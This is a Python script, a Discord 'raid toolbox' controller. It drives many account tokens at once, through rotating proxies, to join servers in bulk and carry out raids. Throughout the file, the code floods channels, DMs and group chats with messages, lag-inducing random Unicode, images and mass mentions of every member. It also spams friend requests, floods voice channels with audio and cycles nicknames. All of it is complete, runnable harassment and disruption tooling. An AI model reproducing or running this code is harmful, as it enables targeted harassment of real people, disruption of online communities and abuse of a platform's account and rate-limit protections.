#!/usr/bin/env python3
# Raid ToolBox Attack Controller
# Author: DeadBread76 - https://github.com/DeadBread76/
# July 3rd, 2019 - July , 2019
#
# Copyright (c) 2019, DeadBread
#
# Permission to use, copy, modify, and/or distribute this software for any
# purpose with or without fee is hereby granted, provided that the above
# copyright notice and this permission notice appear in all copies.
#
# THE SOFTWARE IS PROVIDED "AS IS" AND THE AUTHOR DISCLAIMS ALL WARRANTIES
# WITH REGARD TO THIS SOFTWARE INCLUDING ALL IMPLIED WARRANTIES OF
# MERCHANTABILITY AND FITNESS. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY
# SPECIAL, DIRECT, INDIRECT, OR CONSEQUENTIAL DAMAGES OR ANY DAMAGES
# WHATSOEVER RESULTING FROM LOSS OF USE, DATA OR PROFITS, WHETHER IN AN ACTION
# OF CONTRACT, NEGLIGENCE OR OTHER TORTIOUS ACTION, ARISING OUT OF OR IN
# CONNECTION WITH THE USE OR PERFORMANCE OF THIS SOFTWARE.

import os
import sys
import ast
import zlib
import json
import time
import psutil
import random
import requests
from datetime import datetime
import subprocess
import PySimpleGUI as sg
from itertools import cycle
from concurrent.futures import ThreadPoolExecutor

executor = ThreadPoolExecutor(max_workers=800)
mode = sys.argv[1]
pycommand = sys.argv[2]
useproxies = sys.argv[3]
climode = int(sys.argv[4])
tokenlist = open("tokens.txt").read().splitlines()
sg.ChangeLookAndFeel('Dark2')
if useproxies == 'True':
    if not os.path.exists('proxies.txt'):
        with open ("proxies.txt","a+") as handle:
            handle.write('\n')
        sys.exit()
    else:
        with open ("proxies.txt", "r") as handle:
            proxies = handle.read().split("\n")
        proxy_pool = cycle(proxies)

true = 'true'
false = 'false'

def asciigen(length):
    asc = ''
    for x in range(int(length)):
        num = random.randrange(13000)
        asc = asc + chr(num)
    return asc

if mode == 'joiner':
    def join(token,link,proxy):
        headers = {'Authorization': token, 'Content-Type': 'application/json', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'}
        requests.post("https://canary.discordapp.com/api/v6/invite/{}".format(str(link)), headers=headers)
    if climode == 0:
        layout = [[sg.Text('Enter Invite to join.'), sg.InputText(size=(30,1)),sg.RButton('Join',button_color=('white', 'firebrick4'),size=(10,1)), sg.Checkbox('Log Info', tooltip='Spam with Ascii instead of text.',size=(5,1))]]
        window = sg.Window('RTB | Joiner', layout)
        event, values = window.Read()
        window.Close()
        link = values[0]
        log = values[1]
        if link == '':
            sys.exit()
    else:
        link = sys.argv[5]
        log = False
    if 'https://discordapp.com/invite/' in link:
        link = link[30:]
    elif len(link) > 7:
        link = link[19:]
    for token in tokenlist:
        executor.submit(join,token,link,None)
    if log == True:
        try:
            s = requests.get("https://canary.discordapp.com/api/v6/invite/{}".format(link)).text
            serjson = json.loads(s)
            with open("JoinerLogs.txt", "a+", errors='ignore') as handle:
                handle.write("=======================\n{}\n=======================\nInvite Code: {}\nServer name: {}\nServer ID: {}\nInvite channel ID: {}\nInvite Channel Name: {}\nVerification Level: {}\n\n".format(str(datetime.now()),serjson['code'],serjson['guild']['name'],serjson['guild']['id'],serjson['channel']['id'],serjson['channel']['name'],serjson['guild']['verification_level']))
            layout = [[sg.Text('Server Name: {}'.format(serjson['guild']['name']))],
                    [sg.Text('Server ID: {}'.format(serjson['guild']['id']))],
                    [sg.Button('kthxbye',button_color=('white', 'firebrick4'),size=(30,1))]
                    ]
            window = sg.Window('RTB | Joiner', layout)
            event, values = window.Read()
            window.Close()
        except Exception:
            pass

elif mode == 'leaver':
    def leave(token,ID,proxy):
        headers = {'Authorization': token, 'Content-Type': 'application/json', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'}
        requests.delete("https://canary.discordapp.com/api/v6/users/@me/guilds/{}".format(str(ID)), headers=headers)
    if climode == 0:
        layout = [[sg.Text('Enter server ID to leave.'), sg.InputText(size=(30,1)),sg.RButton('Leave',button_color=('white', 'firebrick4'),size=(10,1))]]
        window = sg.Window('RTB | Leaver', layout)
        event, values = window.Read()
        window.Close()
        ID = values[0]
        if ID == '':
            sys.exit()
    else:
        ID = sys.argv[5]
    for token in tokenlist:
        executor.submit(leave,token,ID,None)

elif mode == 'groupleaver':
    def grleave(token,ID,proxy):
        headers = {'Authorization': token, 'Content-Type': 'application/json', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'}
        requests.delete("https://canary.discordapp.com/api/v6/channels/{}".format(str(ID)), headers=headers)
    if climode == 0:
        layout = [[sg.Text('Enter Group ID to leave.'), sg.InputText(size=(30,1)),sg.RButton('Leave',button_color=('white', 'firebrick4'),size=(10,1))]]
        window = sg.Window('RTB | Group DM Leaver', layout)
        event, values = window.Read()
        window.Close()
        ID = values[0]
        if ID == '':
            sys.exit()
    else:
        ID = sys.argv[5]
    for token in tokenlist:
        executor.submit(grleave,token,ID,None)

elif mode == 'messagespam':
    def sendmessage(token,text,channel,server,proxy):
        headers = {'Authorization': token, 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'}
        payload = {"content": text, "tts": false}
        if channel == 'all':
            chanjson = requests.get("https://canary.discordapp.com/api/v6/guilds/{}/channels".format(server),headers=headers).text
            channellist = json.loads(chanjson)
            while True:
                for channel in channellist:
                    if not channel['type'] == 0:
                        continue
                    else:
                        src = requests.post("https://canary.discordapp.com/api/v6/channels/{}/messages".format(channel['id']), headers=headers, json=payload)
                        if "You are being rate limited." in str(src.content):
                            time.sleep(5)
        else:
            headers = {'Authorization': token, 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'}
            payload = {"content" : text,"tts" : false}
            while True:
                src = requests.post("https://canary.discordapp.com/api/v6/channels/{}/messages".format(channel), headers=headers, json=payload)
                if "You are being rate limited." in str(src.content):
                    time.sleep(5)
    if climode == 0:
        layout = [
              [sg.Text('Text To Spam', size=(15, 1)), sg.InputText()],
              [sg.Text('Channel ID', size=(15, 1)), sg.InputText('all')],
              [sg.Text('Server ID', size=(15, 1)), sg.InputText()],
              [sg.RButton('Start',button_color=('white', 'firebrick4'),size=(10,1))]
             ]
        window = sg.Window('RTB | Message Spammer', layout)
        event, values = window.Read()
        window.Close()
        if event == "Start":
            pass
        else:
            sys.exit()
        text = values[0]
        channelid = values[1]
        SERVER = values[2]
    else:
        text = sys.argv[5]
        channelid = sys.argv[6]
        SERVER = sys.argv[7]
    for token in tokenlist:
        executor.submit(sendmessage,token,text,channelid,SERVER,None)

elif mode == 'asciispam':
    def sendascii(token,channel,server,proxy):
        headers = {'Authorization': token, 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'}
        if channel == 'all':
            chanjson = requests.get("https://canary.discordapp.com/api/v6/guilds/{}/channels".format(server),headers=headers).text
            channellist = json.loads(chanjson)
            while True:
                for channel in channellist:
                    payload = {"content": asciigen(1999), "tts": false}
                    if not channel['type'] == 0:
                        continue
                    else:
                        src = requests.post("https://canary.discordapp.com/api/v6/channels/{}/messages".format(channel['id']), headers=headers, json=payload)
                        if "You are being rate limited." in str(src.content):
                            time.sleep(5)
        else:
            while True:
                payload = {"content": asciigen(1999), "tts": false}
                src = requests.post("https://canary.discordapp.com/api/v6/channels/{}/messages".format(channel), headers=headers, json=payload)
                if "You are being rate limited." in str(src.content):
                    time.sleep(5)
    if climode == 0:
        layout = [[sg.Text('WARNING: This will make your Discord client lag by just looking at the channel,\nI recommend not looking at the channels while doing this attack.')],
              [sg.Text('Channel ID', size=(15, 1)), sg.InputText('all')],
              [sg.Text('Server ID', size=(15, 1)), sg.InputText()],
              [sg.RButton('Start',button_color=('white', 'firebrick4'),size=(10,1))]
             ]
        window = sg.Window('RTB | Ascii Spammer', layout)
        event, values = window.Read()
        window.Close()
        if event == "Start":
            pass
        else:
            sys.exit()
        channelid = values[0]
        SERVER = values[1]
    else:
        channelid = sys.argv[5]
        SERVER = sys.argv[6]
    for token in tokenlist:
        executor.submit(sendascii,token,channelid,SERVER,None)

elif mode == 'massmention':
    def sendmention(token,channel,server,proxy):
        headers = {'Authorization': token, 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'}
        memberlist = []
        msg = ''
        memb = requests.get("https://canary.discordapp.com/api/v6/guilds/{}/members?limit=1000".format(server),headers=headers).text
        memberjson = json.loads(memb)
        for member in memberjson:
            memberlist.append("<@{}>".format(member['user']['id']))
        for member in memberlist:
            msg += member + ' '
        if channel == 'all':
            chanjson = requests.get("https://canary.discordapp.com/api/v6/guilds/{}/channels".format(server),headers=headers).text
            channellist = json.loads(chanjson)
            while True:
                for channel in channellist:
                    if not channel['type'] == 0:
                        continue
                    else:
                        for m in [msg[i:i+1999] for i in range(0, len(msg), 1999)]:
                            src = requests.post("https://canary.discordapp.com/api/v6/channels/{}/messages".format(channel['id']), headers=headers, json={"content" : m,"tts" : false})
                            if "You are being rate limited." in str(src.content):
                                time.sleep(5)
        else:
            headers = {'Authorization': token, 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'}
            while True:
                for m in [msg[i:i+1999] for i in range(0, len(msg), 1999)]:
                    src = requests.post("https://canary.discordapp.com/api/v6/channels/{}/messages".format(channel), headers=headers, json={"content": m, "tts": false})
                    if "You are being rate limited." in str(src.content):
                        time.sleep(5)
    if climode == 0:
        layout = [
              [sg.Text('Server ID', size=(15, 1)), sg.InputText()],
              [sg.Text('Channel ID', size=(15, 1)), sg.InputText('all')],
              [sg.RButton('Start',button_color=('white', 'firebrick4'),size=(10,1))]
              ]
        window = sg.Window('RTB | Mass Mentioner', layout)
        event, values = window.Read()
        window.Close()
        if event == "Start":
            pass
        else:
            sys.exit()
        SERVER = values[0]
        channelid = values[1]
    else:
        SERVER = sys.argv[5]
        channelid = sys.argv[6]
    for token in tokenlist:
        executor.submit(sendmention,token,channelid,SERVER,None)

elif mode == 'vcspam':
    import youtube_dl
    ydl_opts = {
        'outtmpl': 'RTBFiles/vcspammercache/file.webm',
        'format': 'bestaudio/best',
        'postprocessors': [{
            'key': 'FFmpegExtractAudio',
            'preferredcodec': 'wav',
            'preferredquality': '192',
        }],
    }
    if climode == 0:
        layout = [
              [sg.Text('YouTube Link to play', size=(15, 1)), sg.InputText()],
              [sg.Text('Voice Channel ID', size=(15, 1)), sg.InputText()],
              [sg.Text('Ammount of Tokens', size=(15, 1)), sg.Slider(range=(1,len(tokenlist)),
              default_value=len(tokenlist),
              size=(29,15),
              orientation='horizontal',
              font=('Helvetica', 10))],
              [sg.RButton('Start',button_color=('white', 'firebrick4'),size=(10,1))]
              ]
        window = sg.Window('RTB | Voice Chat Spammer', layout)
        event, values = window.Read()
        window.Close()
        if event == "Start":
            pass
        else:
            sys.exit()
        ytlink = values[0]
        channelid = values[1]
        ammount = values[2]
    else:
        ytlink = sys.argv[5]
        channelid = sys.argv[6]
        ammount = sys.argv[7]
    if not os.path.isdir('RTBFiles/vcspammercache/'):
        os.mkdir("RTBFiles/vcspammercache/")
    with youtube_dl.YoutubeDL(ydl_opts) as ydl:
        info_dict = ydl.extract_info(ytlink, download=False)
        video_id = info_dict.get("id", None)
    if not os.path.isfile('RTBFiles/vcspammercache/{}.wav'.format(video_id)):
        ydl_opts = {
         'outtmpl': 'RTBFiles/vcspammercache/{}.webm'.format(video_id),
         'format': 'bestaudio/best',
         'postprocessors': [{
             'key': 'FFmpegExtractAudio',
             'preferredcodec': 'wav',
             'preferredquality': '192',
         }],
        }
        with youtube_dl.YoutubeDL(ydl_opts) as ydl:
            ydl.download([ytlink])
    count = 0
    for token in tokenlist:
        count += 1
        subprocess.Popen([pycommand,'RTBFiles/vcspam.py',token,channelid,'RTBFiles/vcspammercache/{}.wav'.format(video_id),str(os.getpid()),'None'],stdout=open(os.devnull, "w"), stderr=subprocess.STDOUT)
        if count == int(ammount):
            break
    while True:
        pass

elif mode == 'dmspammer':
    def dmspammer(token,userid,text,ascii,proxy):
        list = []
        headers = {'Authorization': token, 'Content-Type': 'application/json', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'}
        payload = {
            'recipient_id': userid
        }
        src = requests.post('https://canary.discordapp.com/api/v6/users/@me/channels', headers=headers, json=payload)
        userdm = src.content.decode()
        jsonstring = json.loads(userdm).values()
        for x in jsonstring:
            list.append(x)
        userdm = list[2]
        if ascii == True:
            payload = {"content": asciigen(1999), "tts": false}
        else:
            payload = {"content": text, "tts": false}
        while True:
            src = requests.post("https://canary.discordapp.com/api/v6/channels/{}/messages".format(userdm), headers=headers, json=payload)
            if "You are being rate limited." in str(src.content):
                time.sleep(5)
    if climode == 0:
        layout = [
            [sg.Text('Note: The tokens need to share a mutual server with the target for this to work.')],
            [sg.Text('Users ID', size=(15, 1)), sg.InputText()],
            [sg.Text('Text to spam', size=(15, 1)), sg.InputText(), sg.Checkbox('Ascii?', tooltip='Spam with Ascii instead of text.')],
            [sg.RButton('Start',button_color=('white', 'firebrick4'),size=(10,1))]
            ]
        window = sg.Window('RTB | DM Spammer', layout)
        event, values = window.Read()
        window.Close()
        if event == "Start":
            pass
        else:
            sys.exit()
        userid = values[0]
        text = values[1]
        ascii = values[2]
    else:
        userid = sys.argv[5]
        text = sys.argv[6]
        if text == "ascii":
            ascii = True
        else:
            ascii = False
    for token in tokenlist:
        executor.submit(dmspammer,token,userid,text,ascii,None)

elif mode == 'friender':
    def friend(token,userid,proxy):
        headers = {'Authorization': token, 'Content-Type': 'application/json', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'}
        requests.put('https://canary.discordapp.com/api/v6/users/@me/relationships/{}'.format(str(userid)), headers=headers)
    if climode == 0:
        userid = sg.PopupGetText('Enter A Users ID', "RTB | Friend Request Spammer")
        if userid == None:
            sys.exit()
    else:
        userid = sys.argv[5]
    for token in tokenlist:
        executor.submit(friend,token,userid,None)

elif mode == 'groupdmspam':
    def sendgdm(token,text,group,ascii,proxy):
        headers = {'Authorization': token, 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'}
        payload = {"content": text, "tts": false}
        while True:
            if ascii:
                payload = {"content": asciigen(1999), "tts": false}
            src = requests.post("https://canary.discordapp.com/api/v6/channels/{}/messages".format(group), headers=headers, json=payload)
            if "You are being rate limited." in str(src.content):
                time.sleep(5)
    if climode == 0:
        layout = [
              [sg.Text('Text To Spam', size=(15, 1)), sg.InputText(), sg.Checkbox('Ascii?', tooltip='Spam with Ascii instead of text.')],
              [sg.Text('Group ID', size=(15, 1)), sg.InputText()],
              [sg.RButton('Start',button_color=('white', 'firebrick4'),size=(10,1))]
             ]
        window = sg.Window('RTB | Group DM Spammer', layout)
        event, values = window.Read()
        window.Close()
        if event == "Start":
            pass
        else:
            sys.exit()
        text = values[0]
        group = values[2]
        ascii = values[1]
    else:
        text = sys.argv[5]
        group = sys.argv[6]
        if text == "ascii":
            ascii = True
        else:
            ascii = False
    for token in tokenlist:
        executor.submit(sendgdm,token,text,group,ascii,None)

elif mode == 'imagespam':
    def sendimages(token,channel,server,proxy):
        headers = {'Authorization': token, 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'}
        if channel == 'all':
            chanjson = requests.get("https://canary.discordapp.com/api/v6/guilds/{}/channels".format(server),headers=headers).text
            channellist = json.loads(chanjson)
            while True:
                for channel in channellist:
                    payload = {"content": 'https://picsum.photos/{}'.format(random.randint(100,2160)),"tts" : false}
                    if not channel['type'] == 0:
                        continue
                    else:
                        src = requests.post("https://canary.discordapp.com/api/v6/channels/{}/messages".format(channel['id']), headers=headers, json=payload)
                        if "You are being rate limited." in str(src.content):
                            time.sleep(5)
        else:
            while True:
                payload = {"content": 'https://picsum.photos/{}'.format(random.randint(100,2160)),"tts" : false}
                src = requests.post("https://canary.discordapp.com/api/v6/channels/{}/messages".format(channel), headers=headers, json=payload)
                if "You are being rate limited." in str(src.content):
                    time.sleep(5)
    if climode == 0:
        layout = [[sg.Text('This will spam random images from https://picsum.photos/')],
              [sg.Text('Channel ID', size=(15, 1)), sg.InputText('all')],
              [sg.Text('Server ID', size=(15, 1)), sg.InputText()],
              [sg.RButton('Start',button_color=('white', 'firebrick4'),size=(10,1))]
             ]
        window = sg.Window('RTB | Random Image Spammer', layout)
        event, values = window.Read()
        window.Close()
        if event == "Start":
            pass
        else:
            sys.exit()
        channelid = values[0]
        SERVER = values[1]
    else:
        channelid = sys.argv[5]
        SERVER = sys.argv[6]
    for token in tokenlist:
        executor.submit(sendimages,token,channelid,SERVER,None)

elif mode == 'gamechange':
    from websocket import create_connection
    def changegame(token,game,type,status,proxy):
        for token in tokenlist:
            ws = create_connection('wss://gateway.discord.gg/?v=6&encoding=json')
            result = ws.recv()
            if type == "Playing":
                gamejson = {
                    "name": game,
                    "type": 0
                }
            elif type == 'Streaming':
                gamejson = {
                    "name": game,
                    "type": 1,
                    "url": "https://www.twitch.tv/DEADBREAD'S_RAID_TOOLBOX"
                }
            elif type == "Listening to":
                gamejson = {
                    "name": game,
                    "type": 2
                }
            elif type == "Watching":
                gamejson = {
                    "name": game,
                    "type": 3
                }
            payload = {
                'op': 2,
                'd': {
                    'token': token,
                    'properties': {
                        '$os': sys.platform,
                        '$browser': "Discord{}".format(random.randint(1000,9999)),
                        '$device': "Discord{}".format(random.randint(1000,9999)),
                        '$referrer': '',
                        '$referring_domain': ''
                    },
                    'compress': True,
                    'large_threshold': 250,
                    'v': 3,
                    "presence": {
                        "game": gamejson,
                        "status": status,
                        "since": 0,
                        "afk": False
                    }
                }
            }
            to_send = json.dumps(payload)
            ws.send(to_send)
    if climode == 0:
        layout = [[sg.Combo(['Playing', 'Streaming', 'Watching', 'Listening to'], size=(10, 5), default_value='Playing', readonly=True), sg.InputText('osu!',size=(10, 1)),sg.Combo(['online', 'dnd', 'idle'], size=(10, 1), default_value='online', readonly=True)],
                  [sg.RButton('Start',button_color=('white', 'firebrick4'),size=(10,1))]
                  ]
        window = sg.Window('RTB | Status Changer', layout)
        event, values = window.Read()
        window.Close()
        if event == "Start":
            pass
        else:
            sys.exit()
        type = values[0]
        game = values[1]
        status = values[2]
    else:
        type = 'Playing'
        game = sys.argv[5]
        status = 'online'
    while True:
        for token in tokenlist:
            executor.submit(changegame,token,game,type,status,None)
        time.sleep(60)

elif mode == 'nickname':
    def nickname(token,server,name,type,proxy):
        headers = {'Authorization': token, 'Content-Type': 'application/json', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'}
        if type == "Cycle":
            name = []
            for x in name.rstrip():
                name.append(x)
            cyclename = cycle(name)
            newnick = ''
            while True:
                if len(newnick) == len(name.rstrip()):
                    newnick = ''
                newnick += next(cyclename)
                payload = {'nick': newnick}
                requests.patch('https://canary.discordapp.com/api/v6/guilds/{}/members/@me/nick'.format(server), headers=headers,json=payload)
                time.sleep(2)
        elif type == "Ascii":
            while True:
                payload = {'nick': asciigen(32)}
                requests.patch('https://canary.discordapp.com/api/v6/guilds/{}/members/@me/nick'.format(server), headers=headers,json=payload)
                time.sleep(2)
        elif type == "Set":
            payload = {'nick': name}
            requests.patch('https://canary.discordapp.com/api/v6/guilds/{}/members/@me/nick'.format(server), headers=headers,json=payload)
    if climode == 0:
        layout = [
                [sg.Text('Server ID', size=(15, 1)), sg.InputText()],
                [sg.Combo(['Cycle','Ascii','Set'], size=(14, 5), default_value='Cycle', readonly=True),sg.InputText("DeadBread's Raid Toolbox")],
                [sg.RButton('Start',button_color=('white', 'firebrick4'),size=(10,1))]
                ]
        window = sg.Window('RTB | Status Changer', layout)
        event, values = window.Read()
        window.Close()
        if event == "Start":
            pass
        else:
            sys.exit()
        server = values[0]
        type = values[1]
        name = values[2]
    else:
        server = sys.argv[5]
        type = "Ascii"
        name = "None"
    for token in tokenlist:
        executor.submit(nickname,token,server,name,type,None)
